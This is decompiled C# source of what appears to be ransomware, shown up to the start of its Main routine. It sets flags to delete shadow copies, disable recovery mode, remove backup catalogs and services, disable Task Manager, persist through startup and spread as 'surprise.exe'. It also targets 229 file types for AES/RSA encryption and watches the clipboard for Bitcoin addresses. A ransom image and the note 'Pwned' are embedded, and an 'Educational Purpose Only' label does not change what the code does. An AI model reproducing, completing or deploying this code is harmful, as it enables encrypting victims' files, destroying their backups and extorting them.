using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static readonly byte[] _salt = new byte[32];

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "v45hchdrg72ns7m6jmy";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "cmd.exe";

	public static string appMutexRun2 = "oAnWieozQPsRK7Bj83r4";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "Pwned";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	private static bool disableTaskManager = true;

	private static bool checkStopBackupServices = true;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "Educational Purpose Only" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
